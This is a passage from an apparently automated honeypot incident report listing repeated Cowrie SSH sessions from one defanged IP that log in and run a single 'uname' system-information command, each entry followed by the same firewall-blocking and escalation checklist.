| `2026-09-27 13:08:57` | `cowrie.login.success` |
| `2026-09-27 13:08:58` | `cowrie.session.params` |
| `2026-09-27 13:08:58` | `cowrie.command.input` |
| `2026-09-27 13:08:59` | `cowrie.log.closed` |
| `2026-09-27 13:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34adc694719

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:02` | `cowrie.session.connect` |
| `2026-09-27 13:09:02` | `cowrie.client.version` |
| `2026-09-27 13:09:02` | `cowrie.client.kex` |
| `2026-09-27 13:09:03` | `cowrie.login.success` |
| `2026-09-27 13:09:03` | `cowrie.session.params` |
| `2026-09-27 13:09:03` | `cowrie.command.input` |
| `2026-09-27 13:09:03` | `cowrie.log.closed` |
| `2026-09-27 13:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783c1efa21db

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:06` | `cowrie.session.connect` |
| `2026-09-27 13:09:06` | `cowrie.client.version` |
| `2026-09-27 13:09:07` | `cowrie.client.kex` |
| `2026-09-27 13:09:07` | `cowrie.login.success` |
| `2026-09-27 13:09:08` | `cowrie.session.params` |
| `2026-09-27 13:09:08` | `cowrie.command.input` |
| `2026-09-27 13:09:08` | `cowrie.log.closed` |
| `2026-09-27 13:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26219682875

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:12` | `cowrie.session.connect` |
| `2026-09-27 13:09:12` | `cowrie.client.version` |
| `2026-09-27 13:09:12` | `cowrie.client.kex` |
| `2026-09-27 13:09:12` | `cowrie.login.success` |
| `2026-09-27 13:09:13` | `cowrie.session.params` |
| `2026-09-27 13:09:13` | `cowrie.command.input` |
| `2026-09-27 13:09:13` | `cowrie.log.closed` |
| `2026-09-27 13:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f681c9d2fd

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:17` | `cowrie.session.connect` |
| `2026-09-27 13:09:17` | `cowrie.client.version` |
| `2026-09-27 13:09:17` | `cowrie.client.kex` |
| `2026-09-27 13:09:17` | `cowrie.login.success` |
| `2026-09-27 13:09:18` | `cowrie.session.params` |
| `2026-09-27 13:09:18` | `cowrie.command.input` |
| `2026-09-27 13:09:18` | `cowrie.log.closed` |
| `2026-09-27 13:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57dab13702f3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:22` | `cowrie.session.connect` |
| `2026-09-27 13:09:22` | `cowrie.client.version` |
| `2026-09-27 13:09:22` | `cowrie.client.kex` |
| `2026-09-27 13:09:22` | `cowrie.login.success` |
| `2026-09-27 13:09:23` | `cowrie.session.params` |
| `2026-09-27 13:09:23` | `cowrie.command.input` |
| `2026-09-27 13:09:23` | `cowrie.log.closed` |
| `2026-09-27 13:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cdf4f7bb229

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:26` | `cowrie.session.connect` |
| `2026-09-27 13:09:26` | `cowrie.client.version` |
| `2026-09-27 13:09:27` | `cowrie.client.kex` |
| `2026-09-27 13:09:27` | `cowrie.login.success` |
| `2026-09-27 13:09:28` | `cowrie.session.params` |
| `2026-09-27 13:09:28` | `cowrie.command.input` |
| `2026-09-27 13:09:28` | `cowrie.log.closed` |
| `2026-09-27 13:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be8826caebf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:31` | `cowrie.session.connect` |
| `2026-09-27 13:09:31` | `cowrie.client.version` |
| `2026-09-27 13:09:32` | `cowrie.client.kex` |
| `2026-09-27 13:09:32` | `cowrie.login.success` |
| `2026-09-27 13:09:33` | `cowrie.session.params` |
| `2026-09-27 13:09:33` | `cowrie.command.input` |
| `2026-09-27 13:09:33` | `cowrie.log.closed` |
| `2026-09-27 13:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-001be9482b00

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:37` | `cowrie.session.connect` |
| `2026-09-27 13:09:37` | `cowrie.client.version` |
| `2026-09-27 13:09:37` | `cowrie.client.kex` |
| `2026-09-27 13:09:37` | `cowrie.login.success` |
| `2026-09-27 13:09:38` | `cowrie.session.params` |
| `2026-09-27 13:09:38` | `cowrie.command.input` |
| `2026-09-27 13:09:38` | `cowrie.log.closed` |
| `2026-09-27 13:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36ed57e0198

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:42` | `cowrie.session.connect` |
| `2026-09-27 13:09:42` | `cowrie.client.version` |
| `2026-09-27 13:09:42` | `cowrie.client.kex` |
| `2026-09-27 13:09:42` | `cowrie.login.success` |
| `2026-09-27 13:09:43` | `cowrie.session.params` |
| `2026-09-27 13:09:43` | `cowrie.command.input` |
| `2026-09-27 13:09:43` | `cowrie.log.closed` |
| `2026-09-27 13:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427317eb6d6d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:47` | `cowrie.session.connect` |
| `2026-09-27 13:09:47` | `cowrie.client.version` |
| `2026-09-27 13:09:47` | `cowrie.client.kex` |
| `2026-09-27 13:09:48` | `cowrie.login.success` |
| `2026-09-27 13:09:48` | `cowrie.session.params` |
| `2026-09-27 13:09:48` | `cowrie.command.input` |
| `2026-09-27 13:09:48` | `cowrie.log.closed` |
| `2026-09-27 13:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1536ef48762

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:53` | `cowrie.session.connect` |
| `2026-09-27 13:09:53` | `cowrie.client.version` |
| `2026-09-27 13:09:53` | `cowrie.client.kex` |
| `2026-09-27 13:09:53` | `cowrie.login.success` |
| `2026-09-27 13:09:54` | `cowrie.session.params` |
| `2026-09-27 13:09:54` | `cowrie.command.input` |
| `2026-09-27 13:09:54` | `cowrie.log.closed` |
| `2026-09-27 13:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eeea38fd856

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:09 |
| **Last Seen** | 2026-09-27 13:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:09:58` | `cowrie.session.connect` |
| `2026-09-27 13:09:58` | `cowrie.client.version` |
| `2026-09-27 13:09:58` | `cowrie.client.kex` |
| `2026-09-27 13:09:58` | `cowrie.login.success` |
| `2026-09-27 13:09:59` | `cowrie.session.params` |
| `2026-09-27 13:09:59` | `cowrie.command.input` |
| `2026-09-27 13:09:59` | `cowrie.log.closed` |
| `2026-09-27 13:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e73d3ab5e69

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:03` | `cowrie.session.connect` |
| `2026-09-27 13:10:03` | `cowrie.client.version` |
| `2026-09-27 13:10:03` | `cowrie.client.kex` |
| `2026-09-27 13:10:03` | `cowrie.login.success` |
| `2026-09-27 13:10:04` | `cowrie.session.params` |
| `2026-09-27 13:10:04` | `cowrie.command.input` |
| `2026-09-27 13:10:04` | `cowrie.log.closed` |
| `2026-09-27 13:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56b3a7b68c8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:07` | `cowrie.session.connect` |
| `2026-09-27 13:10:07` | `cowrie.client.version` |
| `2026-09-27 13:10:07` | `cowrie.client.kex` |
| `2026-09-27 13:10:08` | `cowrie.login.success` |
| `2026-09-27 13:10:09` | `cowrie.session.params` |
| `2026-09-27 13:10:09` | `cowrie.command.input` |
| `2026-09-27 13:10:09` | `cowrie.log.closed` |
| `2026-09-27 13:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b10af64884d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:13` | `cowrie.session.connect` |
| `2026-09-27 13:10:13` | `cowrie.client.version` |
| `2026-09-27 13:10:13` | `cowrie.client.kex` |
| `2026-09-27 13:10:13` | `cowrie.login.success` |
| `2026-09-27 13:10:14` | `cowrie.session.params` |
| `2026-09-27 13:10:14` | `cowrie.command.input` |
| `2026-09-27 13:10:14` | `cowrie.log.closed` |
| `2026-09-27 13:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184d1b8667ae

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:18` | `cowrie.session.connect` |
| `2026-09-27 13:10:18` | `cowrie.client.version` |
| `2026-09-27 13:10:18` | `cowrie.client.kex` |
| `2026-09-27 13:10:19` | `cowrie.login.success` |
| `2026-09-27 13:10:20` | `cowrie.session.params` |
| `2026-09-27 13:10:20` | `cowrie.command.input` |
| `2026-09-27 13:10:20` | `cowrie.log.closed` |
| `2026-09-27 13:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e96cafdbcc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:23` | `cowrie.session.connect` |
| `2026-09-27 13:10:23` | `cowrie.client.version` |
| `2026-09-27 13:10:23` | `cowrie.client.kex` |
| `2026-09-27 13:10:23` | `cowrie.login.success` |
| `2026-09-27 13:10:24` | `cowrie.session.params` |
| `2026-09-27 13:10:24` | `cowrie.command.input` |
| `2026-09-27 13:10:24` | `cowrie.log.closed` |
| `2026-09-27 13:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9fde55e4cca

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:28` | `cowrie.session.connect` |
| `2026-09-27 13:10:28` | `cowrie.client.version` |
| `2026-09-27 13:10:28` | `cowrie.client.kex` |
| `2026-09-27 13:10:28` | `cowrie.login.success` |
| `2026-09-27 13:10:29` | `cowrie.session.params` |
| `2026-09-27 13:10:29` | `cowrie.command.input` |
| `2026-09-27 13:10:29` | `cowrie.log.closed` |
| `2026-09-27 13:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b68024a7dc5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:32` | `cowrie.session.connect` |
| `2026-09-27 13:10:32` | `cowrie.client.version` |
| `2026-09-27 13:10:32` | `cowrie.client.kex` |
| `2026-09-27 13:10:33` | `cowrie.login.success` |
| `2026-09-27 13:10:34` | `cowrie.session.params` |
| `2026-09-27 13:10:34` | `cowrie.command.input` |
| `2026-09-27 13:10:34` | `cowrie.log.closed` |
| `2026-09-27 13:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6604ff5271c9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:37` | `cowrie.session.connect` |
| `2026-09-27 13:10:37` | `cowrie.client.version` |
| `2026-09-27 13:10:37` | `cowrie.client.kex` |
| `2026-09-27 13:10:38` | `cowrie.login.success` |
| `2026-09-27 13:10:39` | `cowrie.session.params` |
| `2026-09-27 13:10:39` | `cowrie.command.input` |
| `2026-09-27 13:10:39` | `cowrie.log.closed` |
| `2026-09-27 13:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e95d35ee81d0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:42` | `cowrie.session.connect` |
| `2026-09-27 13:10:42` | `cowrie.client.version` |
| `2026-09-27 13:10:42` | `cowrie.client.kex` |
| `2026-09-27 13:10:42` | `cowrie.login.success` |
| `2026-09-27 13:10:43` | `cowrie.session.params` |
| `2026-09-27 13:10:43` | `cowrie.command.input` |
| `2026-09-27 13:10:44` | `cowrie.log.closed` |
| `2026-09-27 13:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ee0e1ee78a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:47` | `cowrie.session.connect` |
| `2026-09-27 13:10:47` | `cowrie.client.version` |
| `2026-09-27 13:10:47` | `cowrie.client.kex` |
| `2026-09-27 13:10:48` | `cowrie.login.success` |
| `2026-09-27 13:10:48` | `cowrie.session.params` |
| `2026-09-27 13:10:48` | `cowrie.command.input` |
| `2026-09-27 13:10:49` | `cowrie.log.closed` |
| `2026-09-27 13:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e3afc8c3fb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:52` | `cowrie.session.connect` |
| `2026-09-27 13:10:52` | `cowrie.client.version` |
| `2026-09-27 13:10:52` | `cowrie.client.kex` |
| `2026-09-27 13:10:52` | `cowrie.login.success` |
| `2026-09-27 13:10:53` | `cowrie.session.params` |
| `2026-09-27 13:10:53` | `cowrie.command.input` |
| `2026-09-27 13:10:54` | `cowrie.log.closed` |
| `2026-09-27 13:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997841ed2534

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:10 |
| **Last Seen** | 2026-09-27 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:10:57` | `cowrie.session.connect` |
| `2026-09-27 13:10:57` | `cowrie.client.version` |
| `2026-09-27 13:10:57` | `cowrie.client.kex` |
| `2026-09-27 13:10:57` | `cowrie.login.success` |
| `2026-09-27 13:10:58` | `cowrie.session.params` |
| `2026-09-27 13:10:58` | `cowrie.command.input` |
| `2026-09-27 13:10:58` | `cowrie.log.closed` |
| `2026-09-27 13:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4edeb94c1c0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:02` | `cowrie.session.connect` |
| `2026-09-27 13:11:02` | `cowrie.client.version` |
| `2026-09-27 13:11:02` | `cowrie.client.kex` |
| `2026-09-27 13:11:03` | `cowrie.login.success` |
| `2026-09-27 13:11:03` | `cowrie.session.params` |
| `2026-09-27 13:11:03` | `cowrie.command.input` |
| `2026-09-27 13:11:03` | `cowrie.log.closed` |
| `2026-09-27 13:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d09bdd25458a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
